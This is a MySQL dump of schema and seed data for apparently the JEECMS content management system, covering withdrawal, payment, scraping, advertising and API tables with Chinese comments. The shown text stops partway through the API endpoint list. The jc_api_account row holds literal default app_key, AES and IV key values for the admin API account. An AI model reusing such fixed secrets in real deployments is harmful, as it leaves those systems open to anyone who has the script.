SET FOREIGN_KEY_CHECKS=0;

CREATE TABLE `jc_account_draw` (
  `account_draw_id` int(11) NOT NULL AUTO_INCREMENT,
  `draw_user_id` int(11) NOT NULL DEFAULT '0' COMMENT '提现申请者',
  `apply_account` varchar(100) DEFAULT '' COMMENT '申请账户（微信号或支付宝账户）',
  `apply_amount` double NOT NULL DEFAULT '0' COMMENT '提现申请金额',
  `apply_status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '处理状态(0申请中 1申请成功待支付 2申请失败 3提现成功)',
  `account_pay_id` int(11) DEFAULT NULL COMMENT '申请成功后支付ID',
  `apply_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '申请时间',
  PRIMARY KEY (`account_draw_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户账户提现申请';

#
# Dumping data for table jc_account_draw
#


#
# Source for table jc_account_pay
#

CREATE TABLE `jc_account_pay` (
  `account_pay_id` bigint(20) NOT NULL AUTO_INCREMENT,
  `draw_num` varchar(50) NOT NULL DEFAULT '' COMMENT '内部流水号',
  `pay_user_id` int(11) NOT NULL DEFAULT '0' COMMENT '支付者',
  `draw_user_id` int(11) NOT NULL DEFAULT '0' COMMENT '提现者',
  `pay_account` varchar(100) NOT NULL DEFAULT '' COMMENT '支出账户',
  `draw_account` varchar(100) NOT NULL DEFAULT '' COMMENT '收入账户(微信账户名)',
  `pay_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '支付时间',
  `weixin_num` varchar(100) DEFAULT NULL COMMENT '微信流水号',
  `alipay_num` varchar(100) DEFAULT NULL COMMENT '支付宝流水号',
  PRIMARY KEY (`account_pay_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户账户提现支付';

#
# Dumping data for table jc_account_pay
#


#
# Source for table jc_acquisition
#

CREATE TABLE `jc_acquisition` (
  `acquisition_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `channel_id` int(11) NOT NULL,
  `type_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `acq_name` varchar(50) NOT NULL COMMENT '采集名称',
  `start_time` datetime DEFAULT NULL COMMENT '开始时间',
  `end_time` datetime DEFAULT NULL COMMENT '停止时间',
  `status` int(11) NOT NULL DEFAULT '0' COMMENT '当前状态(0:静止;1:采集;2:暂停)',
  `curr_num` int(11) NOT NULL DEFAULT '0' COMMENT '当前号码',
  `curr_item` int(11) NOT NULL DEFAULT '0' COMMENT '当前条数',
  `total_item` int(11) NOT NULL DEFAULT '0' COMMENT '每页总条数',
  `pause_time` int(11) NOT NULL DEFAULT '0' COMMENT '暂停时间(毫秒)',
  `page_encoding` varchar(20) NOT NULL DEFAULT 'GBK' COMMENT '页面编码',
  `plan_list` longtext COMMENT '采集列表',
  `dynamic_addr` varchar(255) DEFAULT NULL COMMENT '动态地址',
  `dynamic_start` int(11) DEFAULT NULL COMMENT '页码开始',
  `dynamic_end` int(11) DEFAULT NULL COMMENT '页码结束',
  `linkset_start` varchar(255) DEFAULT NULL COMMENT '内容链接区开始',
  `linkset_end` varchar(255) DEFAULT NULL COMMENT '内容链接区结束',
  `link_start` varchar(255) DEFAULT NULL COMMENT '内容链接开始',
  `link_end` varchar(255) DEFAULT NULL COMMENT '内容链接结束',
  `title_start` varchar(255) DEFAULT NULL COMMENT '标题开始',
  `title_end` varchar(255) DEFAULT NULL COMMENT '标题结束',
  `keywords_start` varchar(255) DEFAULT NULL COMMENT '关键字开始',
  `keywords_end` varchar(255) DEFAULT NULL COMMENT '关键字结束',
  `description_start` varchar(255) DEFAULT NULL COMMENT '描述开始',
  `description_end` varchar(255) DEFAULT NULL COMMENT '描述结束',
  `content_start` varchar(255) DEFAULT NULL COMMENT '内容开始',
  `content_end` varchar(255) DEFAULT NULL COMMENT '内容结束',
  `pagination_start` varchar(255) DEFAULT NULL COMMENT '内容分页开始',
  `pagination_end` varchar(255) DEFAULT NULL COMMENT '内容分页结束',
  `queue` int(11) NOT NULL DEFAULT '0' COMMENT '队列',
  `repeat_check_type` varchar(20) NOT NULL DEFAULT 'NONE' COMMENT '重复类型',
  `img_acqu` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否采集图片',
  `content_prefix` varchar(255) DEFAULT NULL COMMENT '内容地址补全url',
  `img_prefix` varchar(255) DEFAULT NULL COMMENT '图片地址补全url',
  `view_start` varchar(255) DEFAULT NULL COMMENT '浏览量开始',
  `view_end` varchar(255) DEFAULT NULL COMMENT '浏览量结束',
  `view_id_start` varchar(255) DEFAULT NULL COMMENT 'id前缀',
  `view_id_end` varchar(255) DEFAULT NULL COMMENT 'id后缀',
  `view_link` varchar(255) DEFAULT NULL COMMENT '浏览量动态访问地址',
  `releaseTime_start` varchar(255) DEFAULT NULL COMMENT '发布时间开始',
  `releaseTime_end` varchar(255) DEFAULT NULL COMMENT '发布时间结束',
  `author_start` varchar(255) DEFAULT NULL COMMENT '作者开始',
  `author_end` varchar(255) DEFAULT NULL COMMENT '作者结束',
  `origin_start` varchar(255) DEFAULT NULL COMMENT '来源开始',
  `origin_end` varchar(255) DEFAULT NULL COMMENT '来源结束',
  `releaseTime_format` varchar(255) DEFAULT NULL COMMENT '发布时间格式',
  `origin_appoint` varchar(255) DEFAULT NULL COMMENT '指定来源',
  PRIMARY KEY (`acquisition_id`),
  KEY `fk_jc_acquisition_channel` (`channel_id`),
  KEY `fk_jc_acquisition_contenttype` (`type_id`),
  KEY `fk_jc_acquisition_site` (`site_id`),
  KEY `fk_jc_acquisition_user` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='CMS采集表';

#
# Dumping data for table jc_acquisition
#

INSERT INTO `jc_acquisition` (`acquisition_id`,`site_id`,`channel_id`,`type_id`,`user_id`,`acq_name`,`start_time`,`end_time`,`status`,`curr_num`,`curr_item`,`total_item`,`pause_time`,`page_encoding`,`plan_list`,`dynamic_addr`,`dynamic_start`,`dynamic_end`,`linkset_start`,`linkset_end`,`link_start`,`link_end`,`title_start`,`title_end`,`keywords_start`,`keywords_end`,`description_start`,`description_end`,`content_start`,`content_end`,`pagination_start`,`pagination_end`,`queue`,`repeat_check_type`,`img_acqu`,`content_prefix`,`img_prefix`,`view_start`,`view_end`,`view_id_start`,`view_id_end`,`view_link`,`releaseTime_start`,`releaseTime_end`,`author_start`,`author_end`,`origin_start`,`origin_end`,`releaseTime_format`,`origin_appoint`) VALUES (1,1,75,1,1,'测试采集',NULL,NULL,0,0,0,0,500,'UTF-8','http://roll.news.sina.com.cn/s/channel.php?ch=01#col=91&spec=&type=&ch=01&k=&offset_page=0&offset_num=0&num=60&asc=&page=3','',2,10,'<div class=\"d_list_txt\" id=\"d_list\">','<div class=\"pagebox\">','<span class=\"c_tit\"><a href=\"','\" target=\"_blank\">','<meta property=\"og:title\" content=\"','\" />',NULL,NULL,'','','<div class=\"article article_16\" id=\"artibody\">','<p class=\"article-editor\">',NULL,NULL,0,'NONE',0,'','','','','','','','','','','','','','yyyy-MM-dd HH:mm:ss','');

#
# Source for table jc_acquisition_history
#

CREATE TABLE `jc_acquisition_history` (
  `history_id` int(11) NOT NULL AUTO_INCREMENT,
  `channel_url` varchar(255) NOT NULL DEFAULT '' COMMENT '栏目地址',
  `content_url` varchar(255) NOT NULL DEFAULT '' COMMENT '内容地址',
  `title` varchar(255) DEFAULT NULL COMMENT '标题',
  `description` varchar(20) NOT NULL DEFAULT '' COMMENT '描述',
  `acquisition_id` int(11) DEFAULT NULL COMMENT '采集源',
  `content_id` int(11) DEFAULT NULL COMMENT '内容',
  PRIMARY KEY (`history_id`),
  KEY `fk_acquisition_history_acquisition` (`acquisition_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='采集历史记录表';

#
# Dumping data for table jc_acquisition_history
#


#
# Source for table jc_acquisition_temp
#

CREATE TABLE `jc_acquisition_temp` (
  `temp_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) DEFAULT NULL,
  `channel_url` varchar(255) NOT NULL DEFAULT '' COMMENT '栏目地址',
  `content_url` varchar(255) NOT NULL DEFAULT '' COMMENT '内容地址',
  `title` varchar(255) DEFAULT NULL COMMENT '标题',
  `finish_percent` int(3) NOT NULL DEFAULT '0' COMMENT '百分比',
  `description` varchar(20) NOT NULL DEFAULT '' COMMENT '描述',
  `seq` int(3) NOT NULL DEFAULT '0' COMMENT '顺序',
  PRIMARY KEY (`temp_id`),
  KEY `fk_jc_temp_site` (`site_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='采集进度临时表';

#
# Dumping data for table jc_acquisition_temp
#


#
# Source for table jc_advertising
#

CREATE TABLE `jc_advertising` (
  `advertising_id` int(11) NOT NULL AUTO_INCREMENT,
  `adspace_id` int(11) NOT NULL,
  `site_id` int(11) NOT NULL,
  `ad_name` varchar(100) NOT NULL COMMENT '广告名称',
  `category` varchar(50) NOT NULL COMMENT '广告类型',
  `ad_code` longtext COMMENT '广告代码',
  `ad_weight` int(11) NOT NULL DEFAULT '1' COMMENT '广告权重',
  `display_count` bigint(20) NOT NULL DEFAULT '0' COMMENT '展现次数',
  `click_count` bigint(20) NOT NULL DEFAULT '0' COMMENT '点击次数',
  `start_time` date DEFAULT NULL COMMENT '开始时间',
  `end_time` date DEFAULT NULL COMMENT '结束时间',
  `is_enabled` char(1) NOT NULL DEFAULT '1' COMMENT '是否启用',
  PRIMARY KEY (`advertising_id`),
  KEY `fk_jc_advertising_site` (`site_id`),
  KEY `fk_jc_space_advertising` (`adspace_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='CMS广告表';

#
# Dumping data for table jc_advertising
#

INSERT INTO `jc_advertising` (`advertising_id`,`adspace_id`,`site_id`,`ad_name`,`category`,`ad_code`,`ad_weight`,`display_count`,`click_count`,`start_time`,`end_time`,`is_enabled`) VALUES (1,1,1,'www.jeecms.com','text',NULL,1,0,0,NULL,NULL,'1');

#
# Source for table jc_advertising_attr
#

CREATE TABLE `jc_advertising_attr` (
  `advertising_id` int(11) NOT NULL,
  `attr_name` varchar(50) NOT NULL COMMENT '名称',
  `attr_value` varchar(255) DEFAULT NULL COMMENT '值',
  KEY `fk_jc_params_advertising` (`advertising_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS广告属性表';

#
# Dumping data for table jc_advertising_attr
#

INSERT INTO `jc_advertising_attr` (`advertising_id`,`attr_name`,`attr_value`) VALUES (1,'text_title','www.jeecms.com');
INSERT INTO `jc_advertising_attr` (`advertising_id`,`attr_name`,`attr_value`) VALUES (1,'text_target','_blank');
INSERT INTO `jc_advertising_attr` (`advertising_id`,`attr_name`,`attr_value`) VALUES (1,'text_link','http://www.jeecms.com');

#
# Source for table jc_advertising_space
#

CREATE TABLE `jc_advertising_space` (
  `adspace_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `ad_name` varchar(100) NOT NULL COMMENT '名称',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  `is_enabled` char(1) NOT NULL COMMENT '是否启用',
  PRIMARY KEY (`adspace_id`),
  KEY `fk_jc_adspace_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='CMS广告版位表';

#
# Dumping data for table jc_advertising_space
#

INSERT INTO `jc_advertising_space` (`adspace_id`,`site_id`,`ad_name`,`description`,`is_enabled`) VALUES (1,1,'1','111','1');

#
# Source for table jc_api_account
#

CREATE TABLE `jc_api_account` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `app_id` varchar(255) NOT NULL DEFAULT '' COMMENT 'appId',
  `app_key` varchar(255) NOT NULL DEFAULT '' COMMENT 'appKey',
  `aes_key` varchar(100) NOT NULL DEFAULT '' COMMENT 'AES加解密密钥',
  `disabled` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  `iv_key` varchar(50) NOT NULL DEFAULT '' COMMENT 'AES iv key',
  `is_admin` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否默认管理后台API账户',
  `limit_single_device` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否限制单设备同时登陆',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='API应用账户';

#
# Dumping data for table jc_api_account
#

INSERT INTO `jc_api_account` (`id`,`app_id`,`app_key`,`aes_key`,`disabled`,`iv_key`,`is_admin`,`limit_single_device`) VALUES (1,'1580387213331704','Sd6qkHm9o4LaVluYRX5pUFyNuiu2a8oi','S9u978Q31NGPGc5H',0,'X83yESM9iShLxfwS',1,0);

#
# Source for table jc_api_info
#

CREATE TABLE `jc_api_info` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `api_name` varchar(255) NOT NULL DEFAULT '' COMMENT '接口名称',
  `api_url` varchar(255) NOT NULL DEFAULT '' COMMENT '接口URL',
  `api_code` varchar(50) NOT NULL DEFAULT '' COMMENT '接口代码',
  `disabled` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  `limit_call_day` int(11) NOT NULL DEFAULT '0' COMMENT '每日限制调用次数(0无限制)',
  `call_total_count` int(11) NOT NULL DEFAULT '0' COMMENT '总调用次数',
  `call_month_count` int(11) NOT NULL DEFAULT '0' COMMENT '月调用次数',
  `call_week_count` int(11) NOT NULL DEFAULT '0' COMMENT '周调用次数',
  `call_day_count` int(11) NOT NULL DEFAULT '0' COMMENT '日调用次数',
  `last_call_time` timestamp NULL DEFAULT NULL COMMENT '最后一次调用时间',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=77 DEFAULT CHARSET=utf8 COMMENT='API接口信息';

#
# Dumping data for table jc_api_info
#

INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (1,'栏目列表','/api/channel/list.jspx','010101',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (2,'单个栏目','/api/channel/get.jspx','010102',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (3,'新增栏目','/api/channel/save.jspx','010103',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (4,'修改栏目','/api/channel/update.jspx','010104',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (5,'内容列表','/api/content/list.jspx','010201',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (6,'内容获取','/api/content/get.jspx','010202',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (7,'我的内容','/api/content/mycontents.jspx','010203',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (8,'新增内容','/api/content/save.jspx','010204',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (9,'修改内容','/api/content/update.jspx','010205',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (10,'删除内容到回收站','/api/content/del.jspx','010206',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (11,'还原内容','/api/content/recycle.jspx','010207',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (12,'审核内容','/api/content/check.jspx','010208',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (13,'退回内容','/api/content/reject.jspx','010209',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (14,'顶内容','/api/content/up.jspx','010210',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (15,'踩内容','/api/content/down.jspx','010211',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (16,'内容购买','/api/content/buy.jspx','010212',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (17,'内容打赏','/api/content/reward.jspx','010213',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (18,'内容收藏','/api/content/collect.jspx','010301',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (19,'我的收藏','/api/content/mycollect.jspx','010302',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (20,'专题列表','/api/topic/list.jspx','010401',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (21,'专题获取','/api/topic/get.jspx','010402',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (22,'专题保存','/api/topic/save.jspx','010403',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (23,'专题修改','/api/topic/update.jspx','040404',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (24,'全文检索','/api/content/search.jspx','010501',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (25,'Tag列表','/api/contenttag/list.jspx','010601',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (26,'热词列表','/api/searchword/list.jspx','010701',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (27,'友情链接列表','/api/friendlink/list.jspx','010801',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (28,'友情链接分类列表','/api/friendlinkctg/list.jspx','010802',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (29,'广告列表','/api/ad/list.jspx','010901',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (30,'广告分类列表','/api/adctg/list.jspx','010902',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (31,'单广告获取','/api/ad/get.jspx','010903',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (32,'评论列表','/api/comment/list.jspx','011001',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (33,'单评论获取','/api/comment/get.jspx','011002',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (34,'发布评论','/api/comment/save.jspx','011003',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (35,'评论顶','/comment_up.jspx','011004',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (36,'评论踩','/comment_down.jspx','011005',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (37,'我的评论','/api/comment/mylist.jspx','011006',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (38,'留言列表','/api/guestbook/list.jspx','011101',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (39,'我的留言','/api/guestbook/mylist.jspx','011102',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (40,'留言分类列表','/api/guestbookctg/list.jspx','011103',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (41,'单留言获取','/api/guestbook/get.jspx','011104',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (42,'发布留言','/api/guestbook/save.jspx','011105',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (43,'投票列表','/api/vote/list.jspx','011201',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (44,'单个投票','/api/vote/get.jspx','011202',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (45,'投票','/api/vote/save.jspx','011203',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (46,'新增会员','/api/user/add.jspx','011301',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (47,'会员修改资料','/api/user/edit.jspx','011302',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (48,'用户修改密码','/api/user/pwd.jspx','011303',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (49,'读取用户信息','/api/user/get.jspx','011304',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (50,'用户名唯一性检查','/username_unique.jspx','011305',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (51,'字典列表','/api/dictionary/list.jspx','011401',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (52,'我的职位申请','/api/resume/myapplys.jspx','011501',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (53,'申请职位','/api/resume/apply.jspx','011502',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (54,'撤销申请','/api/resume/cancelApply.jspx','011503',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (55,'查看我的简历','/api/resume/get.jspx','011601',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (56,'修改简历','/api/resume/update.jspx','011602',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (57,'站内信列表','/api/message/list.jspx','011701',0,0,0,0,0,0,NULL);
